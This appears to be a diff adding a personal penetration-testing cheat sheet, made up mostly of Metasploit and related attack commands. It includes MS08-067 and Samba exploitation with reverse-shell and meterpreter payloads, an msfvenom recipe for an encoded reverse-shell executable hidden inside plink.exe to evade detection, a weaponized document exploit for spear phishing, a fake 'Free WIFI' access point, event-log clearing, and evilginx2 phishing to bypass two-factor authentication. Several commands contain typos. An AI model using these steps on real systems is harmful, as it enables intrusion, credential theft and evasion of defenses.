+  show options
+  show payloads
+  show targets
+  set RHOST 192.168.1.1
+  set TARGET 3             # show targets list of all systems
+  show options
+  unset RHOST
+  save
+  nmap -sT -A --script=smb-check-vulns -P0 192.168.10.1
+  # MS08-067 - Remove Procedure Call [RPC] service
+  msf > search ms08_067
+      > use windows/smb/ms08_67_netapi
+      > set PAYLOAD windows/meterpreter/reverse_tcp
+      > show targets
+      > show options
+      > exploit
+      > sessions -l
+      > sessions -i 1
+      > shell
+
+# Exploiting Ubuntu
+#------------------------------------------------------------------------------
+msf > nmap -sT -A -P0 192.168.1.10
+    > search samba
+    > use linux/samba/lsa_transnames_heap
+    > show payloads
+    > set payload linux /x86/shell_bind_tcp
+    > set LPORt 8080
+    > set RHOST 192.168.1.10
+    > exploit
+
+# Avoiding Detection
+#------------------------------------------------------------------------------
+# Creating Stand-Alone Binaries with ms
+msfvenom -l payloads                     # list all payloads
+msfvenom -l encoders                     # list all encoding
+# create exe file with encoding
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.5 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
+
+# multi encoding
+
+
+
+
+# multi encoding with shikata_ga_nai
+# custom executable templates
+# Launching a Payload Stealthily
+
+
+# Client-side attacks
+#------------------------------------------------------------------------------
+# PDF, WORD  -  Heap Spraying
+# Browser-Based Exploits
+# NOP - do nothing and move to the next instruction
+# Immunity Debugger     -> F2 > breakpoint   F7 > walkdown
+
+# File Format Exploits
+# file format bugs as a spear phishing attack
+msf > search ms11_006                   # win stact buffer overflow
+use exploit/windows/fileformat/ms11_006_createsizeddibsection
+#set payload payload/windows/x64/meterpreter_reverse_tcp
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 443
+exploit                 # creates msf.doc
+
+# File format with multi handler listener
+use exploit/windows/fileformat/ms11_006_createsizeddibsection
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 443
+exploit -j             # exploit running as backbround job
+session -i 1
+
+
+
+# Auxiliary
+#------------------------------------------------------------------------------
+/usr/share/metasploit-framework/modules/auxiliary
+show auxiliary
+use scanner/http/webdav_scanner
+info
+search scan
+# Two Factor Authentication
+ner/http
+set RHOSTS 192.168.1.10, 192.168.1.20
+
+# New Auxiliary module
+cd /usr/share/metasploit-framework/modules/auxiliary/admin/
+wget http://carnal0wrange.goolgecode.com/.../foursquare.rb
+search foursquare
+use admin/foursquare
+
+
+# Social Engineer Toolkit
+#------------------------------------------------------------------------------
+setoolkit
+WEBATTACK_EMAIL=ON
+SELF_SIGNED_APPLET=ON   #web-based,Java applet atck uses self-signed JavaApplets
+AUTO_DETECT=ON          # detect your local IP address automatically
+./set
+./set-web
+# Multiple web attack methods
+# Teensy USB HID Attack Vector
+     - you can emulate a keyboard and mouse. When you insert device it will be
+       detected as a keyboard and using the microprocessor and onboard flash
+       memory storage, you can send a very fast set of keystrokes to target
+# FAST-TRACK
+setoolkit
+./fast-track.py -i           # interactive
+./fast-track.py -g           # to load web interface
+   - SQL injections
+
+
+# KARMETASPLOIT           - wireless attact vectors
+#------------------------------------------------------------------------------
+wget http://www.offensive-security.com/downloads/karma.rc
+cat karma.rc
+# airbase-ng is used to create Karmetasploit's fake access point
+# airmon-ng start wlan0
+airbase-ng -P -C 30 -e "Free WIFI" -v mon0
+        -P > access point to respond to all probes, to beacon every 30s,verbose
+        - created tap interface at0
+ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
+dhcp -cf /etc/dhcp/dhclient.conf at0
+ps aux | grep dhcpd
+tail -f /var/log/messages
+msf > resource karma.rc
+
+
+# Creating your own exploits
+#------------------------------------------------------------------------------
+# art of Fuzzing
+# Controling the Structured Exception Handler
+# Hopping Around SEH Restrictions
+# Bad characters and Remote Code Execution
+
+# Porting Exploits to the metasploit framework
+#------------------------------------------------------------------------------
+
+# Meterpreter Scripting
+#------------------------------------------------------------------------------
+print_line("you are in")
+print_status("you are in")
+print_good("you are in")
+print_error("error")
+# Meterpreter Mixins
+cmd_exec(cmd)
+eventlog_clear(evt = "" )
+
+# Tomcat
+use multi/http/tomcat_mgr_deploy
+
+#------------------------------------------------------------------------------
+# WEB Penetration
+#------------------------------------------------------------------------------
+wget -q -O - https://archive.kali.org/archive-key.asc | sudo apt-key add
+sudo apt-get update
+sudo apt-get upgrade
+
+nmap -p 80,443 --script=http-waf-detect <ip>
+
+
+#------------------------------------------------------------------------------
+# Two Factor Authentication
+#------------------------------------------------------------------------------
+# evilginx2 is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection.
+https://vimeo.com/281220095
+https://github.com/kgretzky/evilginx2
+# outlook user
+# copy plugin edit cokky extension into chrome
+# evilginx_parser.py -i /tmp/log/phish-google.log
+
+# PE Infector
+#------------------------------------------------------------------------------
+# https://www.adlice.com/chronicles-pe-infector/
+
+
+# Kubernetes
+#------------------------------------------------------------------------------
+https://www.youtube.com/watch?v=ivmn1Oay41g
+
+
+# Egghunter Exploitation
+# https://resources.infosecinstitute.com/buffer-overflow-vulnserver/
+#------------------------------------------------------------------------------
+# fuzzy testing
 
